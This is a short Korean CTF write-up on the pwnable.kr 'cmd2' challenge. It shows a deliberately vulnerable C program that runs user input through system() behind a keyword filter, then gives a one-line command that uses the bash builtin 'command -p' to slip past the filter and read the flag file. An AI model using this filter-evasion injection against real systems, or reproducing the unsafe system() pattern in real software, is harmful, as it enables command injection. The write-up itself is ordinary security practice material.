---
sort: 15
---

# cmd2

home 디렉토리에 cmd2.c파일에 소스코드가 들어있다.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

strstr을 통해서 사용자 input을 검열하는 모습이다.<br>
그리고 PATH 환경변수를 조져버린모습이다.<br>
환경변수를 조져버렸기 때문에 명령어 프로그램을 사용하려면 절대경로를 사용해야한다.<br>
그러나 `/`를 필터링하기 때문에 명령어 프로그램을 사용할 수 없다.<br>
따라서 PATH가 없어도 사용할 수 있는 shell 내부 명령어를 사용해야한다.<br>
builtin command에 대한 list는 [여기](https://www.computerhope.com/unix/bash/index.html)에서 얻을 수 있다.<br>
그 중, command를 이용해서 문제를 풀었다. [여기](https://askubuntu.com/questions/512770/what-is-use-of-command-command)를 참고했다.

```bash
cmd2@pwnable:~$ ./cmd2 "command -p cat f*"
```

```tip
## 알게 된 점

bash builtin command
```